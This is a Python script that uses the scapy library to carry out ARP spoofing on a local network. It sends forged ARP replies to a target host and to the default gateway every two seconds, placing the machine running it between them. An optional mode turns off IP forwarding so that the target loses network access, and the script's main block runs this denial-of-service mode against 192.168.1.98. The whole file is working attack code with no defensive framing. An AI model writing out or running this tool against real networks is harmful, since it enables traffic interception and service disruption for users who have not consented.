import os
import subprocess
import time
from threading import Thread
from scapy.config import conf
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp


def enable_ip_forwarding():
    print("\n[*] Enabling IP Forwarding\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def disable_ip_forwarding():
    print("[*] Disabling IP Forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def get_mac(ip):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def defgatewayfactory():
    """
    Returns a tuple with default gateway IP and MAC
    :return: tuple[str,str] (gwIP,gwMAC)
    """
    gw = conf.route.route("0.0.0.0")[2]
    mac = get_mac(gw)
    return gw, mac


class Spoofer(Thread):
    def __init__(self, victim_ip, denyservice=False, gatewayfact=defgatewayfactory, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.denyservice = denyservice
        self.routerIP, self.routerMAC = gatewayfact()
        self.victimMAC = get_mac(victim_ip)
        self.victimIP = victim_ip
        self.stopped = False

    def stop(self):
        self.stopped = True

    def run(self):
        if self.denyservice:
            disable_ip_forwarding()
        while not self.stopped:
            print("Spoofing...", end='\r')
            send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst=self.victimMAC))
            send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst=self.routerMAC))
            time.sleep(2)

    def restore_arp(self):
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimMAC),
             count=7)
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.routerMAC),
             count=7)

    def __enter__(self):
        self.forward = int(
            subprocess.check_output("cat /proc/sys/net/ipv4/ip_forward", shell=True).decode('utf-8').rstrip())
        print("[*] IP forwarding is set to ", self.forward)
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        print("[*] Restoring ARP table")
        self.restore_arp()
        print("[*] Restoring IP forwarding state to", self.forward)
        if self.forward == 1:
            enable_ip_forwarding()
        elif self.forward == 0:
            disable_ip_forwarding()


if __name__ == '__main__':
    with Spoofer("192.168.1.98", denyservice=True) as spoof:
        try:
            spoof.run()
        except KeyboardInterrupt as e:
            pass
